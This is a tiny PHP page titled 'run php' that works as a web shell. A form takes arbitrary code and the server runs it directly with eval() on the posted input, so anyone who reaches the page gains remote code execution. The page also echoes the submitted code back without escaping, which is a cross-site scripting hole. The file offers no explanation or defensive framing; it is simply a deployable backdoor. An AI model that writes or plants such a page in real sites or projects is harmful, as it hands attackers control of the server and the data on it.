<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>run php</title>
    <style>textarea{
        width: 100%;
    }</style>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="f">
<textarea name="code" id="" rows="10"><?php echo $_POST['code'];?></textarea>
<input type="submit" value="run">
</form>    
<textarea name="kq" id="" rows="10"><?php 
if (isset($_POST['code'])) {
    eval($_POST['code']);
    getcwd();
}
?></textarea>
</body>
</html>
